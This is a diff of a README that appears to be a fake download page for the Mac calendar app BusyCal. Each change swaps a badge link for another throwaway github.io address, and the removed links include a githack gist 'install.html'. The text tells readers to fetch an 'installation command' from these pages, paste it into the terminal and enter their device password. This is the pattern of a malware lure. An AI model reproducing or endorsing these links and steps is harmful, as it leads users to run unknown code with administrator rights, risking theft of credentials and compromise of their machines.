@@ -4,7 +4,7 @@
 BusyCal For Mac is a powerful calendar app designed to help you organize your schedule, manage events, and stay productive. 📅  
 Follow the instructions below to install BusyCal safely and get the most out of your time management.  
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://juianaiud84.github.io/.github/busycal)  
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 If the download button does not work, please follow the instructions below using the terminal command.  
 
@@ -23,7 +23,7 @@ If the download button does not work, please follow the instructions below using
 
 1. Get the installation command by clicking this button:  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-555555?style=flat-square)](https://gistcdn.githack.com/ledseachgoogle993/23ab0009105cd91d86ae31a7672cb9d7/raw/92c7a9c364b251a913232d71aa29f9111358558b/install.html)  
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
